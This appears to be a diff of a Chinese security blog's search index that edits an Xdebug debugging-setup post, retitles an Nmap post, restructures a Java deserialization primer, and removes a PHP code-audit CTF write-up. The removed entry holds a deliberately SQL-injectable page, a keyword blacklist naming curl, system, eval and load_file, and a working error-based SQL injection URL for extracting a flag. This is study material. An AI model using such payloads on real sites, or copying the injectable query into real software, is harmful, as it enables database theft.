@@ -43,7 +43,7 @@
         <category>密码学</category>
       </categories>
       <tags>
-        <tag>密码学</tag>
+        <tag>现代密码学导论</tag>
       </tags>
   </entry>
   <entry>
@@ -3446,7 +3446,10 @@
     <content><![CDATA[<!--toc-->
 <p>最近复现 PHP 的一个题目，很想动态调试一下，所以写了这篇文章。</p>
 <span id="more"></span>
-
+<h2 id="2023328"><a href="#2023-3-28" class="headerlink" title="2023/3/28"></a>2023/3/28</h2><p>今天在审计的时候发现了 Phpstudypro 自带安装 xdebug 扩展功能，傻瓜式安装手法：</p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230328170616988.png" alt="image-20230328170616988"></p>
+<p>安装之后会自动在 php.ini 下写入特定的配置选项，可以说是很方便了。但是其默认没有开启远程调试，所以如果我们想打开网页逐步动调，需要手动把 remote_enable 选项设为 On。</p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230328170807919.png" alt="image-20230328170807919"></p>
 <h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><h3 id="1-安装-xdebug"><a href="#1-安装-XDebug" class="headerlink" title="1. 安装 XDebug"></a>1. 安装 XDebug</h3><p>先去 <a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a> 这里把你的 phpinfo 的输出复制上去，随后根据推荐指南下载即可</p>
 <p>以下是我的指南：</p>
 <blockquote>
@@ -3459,32 +3462,31 @@
 </blockquote>
 <h3 id="2-配置-xdebug"><a href="#2-配置-XDebug" class="headerlink" title="2. 配置 XDebug"></a>2. 配置 XDebug</h3><p>在 <strong>php.ini</strong> 末尾添加如下信息</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[XDebug]</span><br><span class="hljs-comment">; 性能分析信息文件的输出目录（根据实际环境修改）</span><br><span class="hljs-attr">xdebug.output_dir</span>=<span class="hljs-string">&quot;C:\phpstudy_pro\PHPTutorial\tmp\xdebug&quot;</span><br><span class="hljs-comment">; 堆栈跟踪文件的存放目录（根据实际环境修改）</span><br><span class="hljs-attr">xdebug.trace_output_dir</span>=<span class="hljs-string">&quot;C:\phpstudy_pro\PHPTutorial\tmp\xdebug&quot;</span><br><span class="hljs-comment">; xdebug 库文件，就是从官网下载下来的dll文件的绝对路径</span><br><span class="hljs-attr">zend_extension</span> = <span class="hljs-string">&quot;C:\phpstudy_pro\Extensions\php\php7.3.4nts\ext\php_xdebug-3.1.6-7.3-vc15-nts-x86_64.dll&quot;</span><br><span class="hljs-comment">; 开启远程调试</span><br><span class="hljs-attr">xdebug.remote_enable</span>= <span class="hljs-literal">On</span><br><span class="hljs-comment">; IP 地址</span><br><span class="hljs-attr">xdebug.client_host</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br><span class="hljs-comment">; xdebug 监听端口和协议</span><br><span class="hljs-attr">xdebug.client_port</span>=<span class="hljs-number">9000</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-comment">; idekey</span><br><span class="hljs-attr">xdebug.idekey</span>=<span class="hljs-string">&quot;PHPSTORM&quot;</span><br><span class="hljs-attr">xdebug.profiler_enable</span>= <span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.auto_trace</span>= <span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.collect_return</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.mode</span>=<span class="hljs-string">&quot;debug&quot;</span><br></code></pre></td></tr></table></figure>
-
-<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="3-配置网站"><a href="#3-配置网站" class="headerlink" title="3. 配置网站"></a>3. 配置网站</h3><p>打开 phpstudy，开启 apache</p>
+<h3 id><a href="#" class="headerlink" title=" "></a> </h3><h3 id="3-配置网站"><a href="#3-配置网站" class="headerlink" title="3. 配置网站"></a>3. 配置网站</h3><p>打开 phpstudy，开启 apache</p>
 <p>我的主域名是 localhost<br>网站根目录是c:\phpstudy\www<br>端口是 800</p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206112615691.png" alt="image-20230206112615691"></p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206112606087.png" alt="image-20230206112606087"></p>
-<h3 id="4-配置-phpstorm"><a href="#4-配置-phpstorm" class="headerlink" title="4. 配置 phpstorm"></a>4. 配置 phpstorm</h3><p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206112750094.png" alt="image-20230206112750094"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206112615691.png" alt="image-20230206112615691"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206112606087.png" alt="image-20230206112606087"></p>
+<h3 id="4-配置-phpstorm"><a href="#4-配置-phpstorm" class="headerlink" title="4. 配置 phpstorm"></a>4. 配置 phpstorm</h3><p><img src="/images/PHP代码审计-环境搭建/image-20230206112750094.png" alt="image-20230206112750094"></p>
 <p><strong>配置调试</strong></p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206112724226.png" alt="image-20230206112724226"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206112724226.png" alt="image-20230206112724226"></p>
 <p>端口与刚刚php.ini里边的xdebug.client_port一样</p>
 <p><strong>配置dbgp</strong></p>
 <p>不用解释了，端口都是和php.ini里边的xdebug.client_port一样，主机填本机的。</p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206112912691.png" alt="image-20230206112912691"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206112912691.png" alt="image-20230206112912691"></p>
 <p><strong>配置服务器</strong></p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206112735908.png" alt="image-20230206112735908"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206112735908.png" alt="image-20230206112735908"></p>
 <p>我127.0.0.1，你也可以直接填 localhost, 只要你知道该域名指向的文件根目录在哪里就行了。<br>后面验证会用到域名对应的文件根目录</p>
 <p><strong>编辑配置：</strong></p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206113057456.png" alt="image-20230206113057456"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206113057456.png" alt="image-20230206113057456"></p>
 <p>新建 php web page页面 （php 网页）</p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206113012459.png" alt="image-20230206113012459"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206113012459.png" alt="image-20230206113012459"></p>
 <h3 id="5-安装-xdebug-helper"><a href="#5-安装-Xdebug-helper" class="headerlink" title="5. 安装 Xdebug helper"></a>5. 安装 Xdebug helper</h3><p>谷歌浏览器扩展商店搜索然后安装即可</p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206140831556.png" alt="image-20230206140831556"></p>
-<p>随后进入选项页面：<strong>chrome-extension:&#x2F;&#x2F;eadndfjplgieldjbigjakmdgkmoaaaoc&#x2F;options.html</strong> 配置 idekey</p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206140854377.png" alt="image-20230206140854377"></p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230206140656041.png" alt="image-20230206140656041"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206140831556.png" alt="image-20230206140831556"></p>
+<p>随后进入选项页面：<strong>chrome-extension://eadndfjplgieldjbigjakmdgkmoaaaoc/options.html</strong> 配置 idekey</p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206140854377.png" alt="image-20230206140854377"></p>
+<p><img src="/images/PHP代码审计-环境搭建/image-20230206140656041.png" alt="image-20230206140656041"></p>
 <h3 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6. 注意事项"></a>6. 注意事项</h3><p>在调试的时候发现页面500之后调试就自动中断了，可以看看这个：<a href="https://blog.csdn.net/qq_44836237/article/details/122324587">(14条消息) XDEBUG调试时页面500和自动中断问题_XiXioo1的博客-CSDN博客_nginx xdebug 自动断开</a></p>
-<h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230221110245588.png" alt="image-20230221110245588"></p>
+<h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><p><img src="/images/PHP代码审计-环境搭建/image-20230221110245588.png" alt="image-20230221110245588"></p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.51cto.com/u_13640989/2709976">https://blog.51cto.com/u_13640989/2709976</a></p>
 ]]></content>
       <categories>
@@ -5704,7 +5706,7 @@
       </tags>
   </entry>
   <entry>
-    <title>tryhackme 渗透测试之 NmapLiveHostDiscovery</title>
+    <title>Nmap 存活主机发现</title>
     <url>/2023/02/07/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BNmapLiveHostDiscovery/index.html</url>
     <content><![CDATA[<!--toc-->
 
@@ -5829,54 +5831,6 @@
 ]]></content>
       <tags>
         <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码审计Day1-in_array函数缺陷</title>
-    <url>/2023/01/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day1-in-array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/index.html</url>
-    <content><![CDATA[<!--toc-->
-
-<p>每日图一乐之php代码审计</p>
-<span id="more"></span>
-
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不得不说红日安全写的是真的好，让人看的很舒服，也学到了很多东西。这一篇文章是在看完Day1后针对留下的习题而写的，in_array函数的漏洞分析直接看原文就可以了。</p>
-<h3 id="题目漏洞代码"><a href="#题目漏洞代码" class="headerlink" title="题目漏洞代码"></a>题目漏洞代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;<br><span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);<br>&#125;<br><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">stop_hack</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;fire&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;fire&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;day1&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stop_hack</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>	<span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;<br>	<span class="hljs-variable">$back_list</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$pattern</span>);<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$back_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$hack</span>)&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$hack</span>/i&quot;</span>, <span class="hljs-variable">$value</span>))<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$hack</span> detected!&quot;</span>);<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"># 搭建CTF环境使用的<span class="hljs-keyword">sql</span>语句<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> day1;<br>use day1;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users (<br>id <span class="hljs-type">int</span>(<span class="hljs-number">6</span>) unsigned auto_increment <span class="hljs-keyword">primary key</span>,<br><span class="hljs-type">name</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>email <span class="hljs-type">varchar</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>salary <span class="hljs-type">int</span>(<span class="hljs-number">8</span>) unsigned <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> );<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;Lucia&#x27;</span>,<span class="hljs-string">&#x27;Lucia@hongri.com&#x27;</span>,<span class="hljs-number">3000</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;Danny&#x27;</span>,<span class="hljs-string">&#x27;Danny@hongri.com&#x27;</span>,<span class="hljs-number">4500</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;Alina&#x27;</span>,<span class="hljs-string">&#x27;Alina@hongri.com&#x27;</span>,<span class="hljs-number">2700</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;Jameson&#x27;</span>,<span class="hljs-string">&#x27;Jameson@hongri.com&#x27;</span>,<span class="hljs-number">10000</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;Allie&#x27;</span>,<span class="hljs-string">&#x27;Allie@hongri.com&#x27;</span>,<span class="hljs-number">6000</span>);<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> flag(flag <span class="hljs-type">varchar</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> flag <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="题目漏洞分析"><a href="#题目漏洞分析" class="headerlink" title="题目漏洞分析"></a>题目漏洞分析</h3><p>题目会接收一个名字为 id 的参数，然后进行SQL查询，注意到这里是有一个黑名单的过滤的。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">stop_hack</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stop_hack</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>	<span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;<br>	<span class="hljs-variable">$back_list</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$pattern</span>);<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$back_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$hack</span>)&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$hack</span>/i&quot;</span>, <span class="hljs-variable">$value</span>))<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$hack</span> detected!&quot;</span>);<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>同时查询完毕之后还有一个 <code>in_array()</code> 函数过滤，其会判断传入经过 stop_hac k函数过滤后的 id 是否在白名单内，如果在就把 sql 语句的查询结果告诉我们，否则就 die。</p>
-<p><code>in_array()</code> 函数在这里第三个参数并没有设置 true，所以比较是一个弱类型的比较，那么我们传入 1a 和 1 比较会被认为是相等的，所以这一步很容易就可以绕过。</p>
-<p>关键的问题在于如何构造sql语句，观察stop_hack 会发现 union 被过滤了，那么联合注入就不行。同时 or 被过滤，导致不能查 information_schema 表。</p>
-<p>最后的 payload 是</p>
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">http://localhost/<span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">4</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,make_set(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag)),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
-
-<p>关于 updatexml 和 make_set 可以看这篇 <a href="https://xz.aliyun.com/t/2160">updatexml injection without concat - 先知社区 (aliyun.com)</a></p>
-<p>但是坦白地说，这个 payload 过于理想了，看起来像是提前知道了表名和字段名都是flag。</p>
-<p>若想要进行正常的 sql 注入该怎么办？现在是查不了 information_schema 数据库的</p>
-<blockquote>
-<p>可以看看这篇 <a href="https://blog.csdn.net/m0_49835838/article/details/109159839">绕过information_schema以及无列名注入</a></p>
-</blockquote>
-<blockquote>
-<p>本地测试的时候 phpstorm 可能会说接收到未授权请求然后阻止了我们脚本的访问，这种情况按照下图设置一下就好了</p>
-</blockquote>
-<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day1-in-array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/image-20230124104642539.png" alt="image-20230124104642539"></p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[<a href="https://xz.aliyun.com/t/2491">红日安全]PHP-Audit-Labs题解之Day1-4 - 先知社区 (aliyun.com)</a></p>
-<p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md">红日安全-七月火</a></p>
-]]></content>
-      <categories>
-        <category>PHP代码审计</category>
-      </categories>
-      <tags>
-        <tag>PHP代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -8972,24 +8926,28 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <span id="more"></span>
 
 <p>学习完反射就可以正式开始学习 Java 反序列化。</p>
-<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><h4 id="什么是-java-序列化和反序列化"><a href="#什么是-java-序列化和反序列化？" class="headerlink" title="什么是 java 序列化和反序列化？"></a>什么是 java 序列化和反序列化？</h4><p>Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。</p>
+<h1 id="java-序列化与反序列化"><a href="#Java-序列化与反序列化" class="headerlink" title="Java 序列化与反序列化"></a>Java 序列化与反序列化</h1><!--toc-->
+<p>学习完反射就可以正式开始学习 Java 反序列化。</p>
+<!--more-->
+
+
+<h2 id="一-定义"><a href="#一-定义" class="headerlink" title="一. 定义"></a>一. 定义</h2><h3 id="11-java-序列化和反序列化是什么"><a href="#1-1-java-序列化和反序列化是什么？" class="headerlink" title="1.1 java 序列化和反序列化是什么？"></a>1.1 java 序列化和反序列化是什么？</h3><p><strong>Java 序列化是指把 Java 对象转换为字节序列的过程</strong>，<strong>而 Java 反序列化是指把字节序列恢复为 Java 对象的过程</strong>。</p>
 <p>序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求数据的对象实例。</p>
-<h3 id="功能和用处"><a href="#功能和用处" class="headerlink" title="功能和用处"></a>功能和用处</h3><h4 id="java-序列化和反序列化有什么功能和用处"><a href="#java-序列化和反序列化有什么功能和用处？" class="headerlink" title="java 序列化和反序列化有什么功能和用处？"></a>java 序列化和反序列化有什么功能和用处？</h4><p> 我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</p>
-<p> 当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p>
-<h4 id="什么时候会用到-java-序列化和反序列化"><a href="#什么时候会用到-Java-序列化和反序列化？" class="headerlink" title="什么时候会用到 Java 序列化和反序列化？"></a>什么时候会用到 Java 序列化和反序列化？</h4><ul>
+<h3 id="12-功能和用处"><a href="#1-2-功能和用处" class="headerlink" title="1.2 功能和用处"></a>1.2 功能和用处</h3><h4 id="1-java-序列化和反序列化有什么功能和用处"><a href="#1-java-序列化和反序列化有什么功能和用处？" class="headerlink" title="1. java 序列化和反序列化有什么功能和用处？"></a>1. java 序列化和反序列化有什么功能和用处？</h4><p>我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java 进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要 Java 序列化与反序列化了。为实现进程间的对象传送，发送方需要把这个Java 对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</p>
+<p> 当我们明晰了为什么需要 Java 序列化和反序列化后，我们很自然地会想 Java 序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p>
+<h4 id="2-什么时候会用到-java-序列化和反序列化"><a href="#2-什么时候会用到-Java-序列化和反序列化？" class="headerlink" title="2. 什么时候会用到 Java 序列化和反序列化？"></a>2. 什么时候会用到 Java 序列化和反序列化？</h4><ul>
 <li>想把内存中的对象保存到一个文件中或者数据库中时候；</li>
 <li>想用套接字在网络上传送对象的时候；</li>
 <li>想通过RMI传输对象的时候</li>
 </ul>
-<h3 id="如何进行-java-序列化和反序列化"><a href="#如何进行-Java-序列化和反序列化" class="headerlink" title="如何进行 Java 序列化和反序列化"></a>如何进行 Java 序列化和反序列化</h3><p>假设我们定义了如下的 Employee 类，该类实现了 Serializable 接口。</p>
+<h2 id="二-如何进行-java-序列化和反序列化"><a href="#二-如何进行-Java-序列化和反序列化？" class="headerlink" title="二. 如何进行 Java 序列化和反序列化？"></a>二. 如何进行 Java 序列化和反序列化？</h2><p>假设我们定义了如下的 Employee 类，该类实现了 Serializable 接口（只有继承了该接口的类才可以序列化）。</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable<br>&#123;<br>   <span class="hljs-keyword">public</span> String name;<br>   <span class="hljs-keyword">public</span> String address;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">int</span> SSN; <span class="hljs-comment">//注意 transient 关键字表明该属性是短暂的，也就是不会被反序列化</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> number;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mailCheck</span><span class="hljs-params">()</span><br>   &#123;<br>      System.out.println(<span class="hljs-string">&quot;Mailing a check to &quot;</span> + name<br>                           + <span class="hljs-string">&quot; &quot;</span> + address);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
